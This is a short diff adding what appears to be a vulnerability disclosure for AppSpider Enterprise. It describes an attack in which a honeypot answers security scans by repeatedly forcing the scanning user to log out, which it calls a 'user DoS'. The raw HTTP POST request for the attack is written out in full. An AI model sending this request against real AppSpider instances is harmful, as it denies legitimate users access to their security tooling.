@@ -1,0 +1,23 @@
+[https://<IP-address>/AppSpiderEnterprise/Account/Logout]https://<IP-address>/AppSpiderEnterprise/Account/Logout
+
+Here's an attack vector:
+
+1) Set up a honeypot that detects Nexpose Security Console scans/attacks (in someway).
+2) Once I get a probe, fire back a logout request.
+3) Continue to logout the active user forever.
+
+It's less damaging than a traditional "hack back" but is sure to irritate the local red team to no end. It's essentially a user DoS. This attack may have been useful as a denial of service against AppSpider instances, allowing an attacker to prevent normal AppSpider usage.
+
+Request:
+
+POST /AppSpiderEnterprise/Account/Logout HTTP/1.1
+Host: <IP_Address>
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+Cookie: <Redacted>
+Connection: close
+Upgrade-Insecure-Requests: 1
